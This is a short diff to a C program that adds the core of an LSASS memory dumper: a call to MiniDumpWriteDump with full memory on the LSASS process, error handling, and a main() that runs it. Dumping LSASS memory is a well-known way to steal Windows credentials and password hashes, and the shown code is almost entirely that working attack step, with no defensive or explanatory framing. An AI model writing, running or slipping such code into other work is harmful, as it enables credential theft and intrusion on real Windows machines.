@@ -28,6 +28,18 @@ void LSASSDump()
         exit(-1);
     }
     printf("[+] Got a handle to the LSASS Process!\n");
+    
+    BOOL ProcDump = MiniDumpWriteDump(lsassProcess, lsassPID, DumpFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
+	if (!ProcDump) {
+		printf("[!] Error while calling MiniDumpWriteDump()\n %d", GetLastError());
+		exit(-1);
+	}
+	printf("[+] Successfully conducted memory dump!\n");
+}
 
+int main()
+{
+	LSASSDump();
+	return 0;
 
 }
